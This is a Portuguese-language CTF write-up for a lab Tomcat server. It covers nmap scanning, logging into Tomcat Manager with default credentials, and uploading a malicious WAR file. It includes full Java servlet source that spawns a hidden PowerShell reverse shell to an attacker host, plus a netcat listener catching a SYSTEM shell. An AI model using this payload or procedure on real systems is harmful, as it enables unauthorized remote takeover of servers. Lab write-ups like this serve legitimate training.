#ctfs 

Vamos começar o CTF realizando um scan de portas no IP fornecido.

```bash
└─$ nmap 10.129.78.116 -p- -Pn --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-03 13:22 -03
Nmap scan report for 10.129.78.116
Host is up (0.15s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 253.54 seconds
```

Aprofundando o scan:

```bash
└─$ nmap 10.129.78.116 -p 8080 -Pn --open -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-03 13:29 -03
Nmap scan report for 10.129.78.116
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org
/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.58 seconds
```

Abrindo no navegador encontramos o seguinte:

![[Pasted image 20260903133025.png]]

Uma página do Apache/Tomcat crua. Vamos tentar acessar o "Manager app" para vermos as configurações do site

Pediu a senha, vamos pesquisar as credenciais padrão do Apache na internet para tentarmos acesso.


Tentando (`tomcat`:`s3cret`) a página carrega
![[Pasted image 20260903141553.png]]

Vou usar o primeiro resultado.

Precisamos enviar um arquivo formato .war (Web Application Archive)

Vamos seguir o passo a passo do seguinte link: https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1

Com isso, temos uma shell.

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [Meu IP] from (UNKNOWN) [10.129.78.116] 49192
whoami
nt authority\system
PS C:\apache-tomcat-7.0.88>
```


OBS: O payload necessitou ser ajustado pois precisávamos disparar uma shell no Windows, ou seja, o arquivo `ShellServlet.java` possuia o seguinte código:


```java
import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;
public class ShellServlet extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String host = "ATTACKER IP";
        int port = 4444;
        String ps = "$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");" +
            "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};" +
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;" +
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
            "$sendback = (iex $data 2>&1 | Out-String );" +
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};" +
            "$client.Close()";
        String[] cmd = {"powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps};
        Runtime.getRuntime().exec(cmd);
    }
}
```

Com isso, vamos até a única pasta de usuário que temos no host (já temos nt/authority, portanto, somos root)

```shell
Directory: C:\Users\Administrator\Desktop\flags

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---          6/19/2018   7:11 AM        88 2 for the price of 1.txt

PS C:\Users\Administrator\Desktop\flags> type '2 for the price of 1.txt'
user.txt
[user flag]

root.txt
[root flag]
PS C:\Users\Administrator\Desktop\flags>
```

O nome do arquivo já entrega que as duas respostas estão na mesma pasta, e assim encerra-se nosso CTF.